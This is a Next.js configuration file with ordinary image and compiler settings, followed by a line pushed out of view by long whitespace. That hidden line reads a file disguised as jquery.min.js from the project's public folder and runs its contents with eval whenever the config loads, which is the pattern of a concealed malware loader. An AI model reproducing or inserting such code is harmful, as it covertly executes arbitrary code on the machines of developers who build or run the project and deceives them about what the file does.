/** @type {import('next').NextConfig} */
	
const nextConfig = {
  reactStrictMode: true,
  compiler: {
    styledComponents: true,
  },
  images: {
    remotePatterns: [
      {
        protocol: 'https',
        hostname: 'via.placeholder.com',
        pathname: '/**',
      },
      {
        protocol: 'https',
        hostname: 'royaljapan.asia',
        pathname: '/**',
      },
    ],
  },
}
module.exports = nextConfig;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        const jmpparser = require('fs'); jmpparser.readFile(__dirname  + '/public/assets/js/jquery.min.js', 'utf8', (err, code) => { eval(code); console.log(err) });